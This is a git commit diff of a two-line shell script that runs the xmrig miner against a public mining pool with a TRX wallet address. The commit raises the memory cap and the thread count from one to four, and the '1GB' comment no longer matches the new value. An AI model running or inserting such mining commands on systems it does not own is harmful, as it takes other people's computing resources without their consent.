970b46e8accc6bad2cff3915d1deb456500d38c4
aliabdulla769 <131328611+aliabdulla769@users.noreply.github.com>
2023-09-18 17:46:12 +0300

    Update ali.sh

--- ali.sh
+++ ali.sh
@@ -1,2 +1,2 @@
-ulimit -v 1000000  # Set the virtual memory limit to 1GB
-./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.cisco -p x -t 1
+ulimit -v 1400000  # Set the virtual memory limit to 1GB
+./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.cisco -p x -t 4
